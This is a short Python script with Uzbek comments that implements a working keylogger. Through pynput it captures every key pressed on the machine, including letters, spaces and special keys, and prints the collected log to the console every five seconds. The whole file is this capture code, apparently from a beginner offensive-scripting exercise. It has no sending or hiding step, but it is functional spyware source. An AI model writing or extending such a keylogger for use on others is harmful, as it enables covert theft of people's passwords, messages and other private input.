#!/usr/bin/env python
import pynput.keyboard
import threading

log = ""

def process_key_press(key):
    global log
    try:
        log += str(key.char)  # Agar tugma harf bo'lsa
    except AttributeError:
        if key == key.space:
            log += " "  # Bo'sh joy tugmasi uchun
        else:
            log += f" [{key}] "  # Maxsus tugmalar uchun
            
def report():
	global log
	print(log)  # Logni chop etish
	log= "" # Logni tozalash
	timer = threading.Timer(5, report)  # 5 soniyadan keyin qayta chaqirish
	timer.start() # Timerni boshlash
 
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

with keyboard_listener:
	report() # Reportni boshlash
	keyboard_listener.join()  # Listenerni ishga tushirish
